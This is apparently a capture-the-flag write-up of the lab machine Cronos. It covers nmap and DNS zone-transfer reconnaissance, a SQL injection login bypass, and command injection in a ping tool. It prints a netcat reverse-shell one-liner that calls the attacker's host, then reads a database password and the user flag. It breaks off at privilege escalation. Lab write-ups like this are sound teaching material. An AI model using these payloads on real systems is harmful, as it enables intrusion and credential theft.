└─# nmap -sC -sV 10.10.10.13
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA)
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA)
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

The fact that port 53 is open gives a hint to dig deeper into DNS and see what I can find.
└─# nslookup
> server 10.10.10.13
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.
└─# dig axfr @10.10.10.13 cronos.htb

; <<>> DiG 9.16.12-Debian <<>> axfr @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13
admin.cronos.htb.	604800	IN	A	10.10.10.13
ns1.cronos.htb.		604800	IN	A	10.10.10.13
www.cronos.htb.		604800	IN	A	10.10.10.13
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
;; Query time: 248 msec
;; SERVER: 10.10.10.13#53(10.10.10.13)
;; WHEN: Tue May 04 00:40:49 EAT 2021
;; XFR size: 7 records (messages 1, bytes 203)
I decide to add cronos.htb to the /etc/hosts and now visiting cronos.htb resolves and am presented with a website.
There is nothing interesting on the main website. I therefor proceed to test http://ns1.cronos.htb/; http://www.cronos.htb/ and http://admin.cronos.htb/
The first two have nothing interesting but the last one has a login page.
I attempt simple SQL injection for the username admin'-- - and any pass and this works.
We are presented with a nettool which can run few commands like ping and traceroute.
Chaining this with more commands I realize it might be possible to do command execution here.
I can read many files including the user file but I decide to get the reverse shell first.
And so I run:
ping 8.8.8.8; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.14 4444 >/tmp/f
And the user flag is pawned!
$ whoami
www-data
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@cronos:/var/www/admin$ ls  
ls
config.php  index.php  logout.php  session.php	welcome.php
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>
www-data@cronos:/var/www/admin$ cat /home/noulis/user.txt
cat /home/noulis/user.txt
51d236438b333970dbba7dc3089be33b
=================Priv Escalation=====================
www-data@cronos:/var/www/admin$ mysql -u admin -p 
mysql -u admin -p 
Enter password: kEjdbRigfBHUREiNSDs
Login into mysql database I get a hash for the admin but that does not seem to lead anywhere. So i decide to run a script to check privileges.
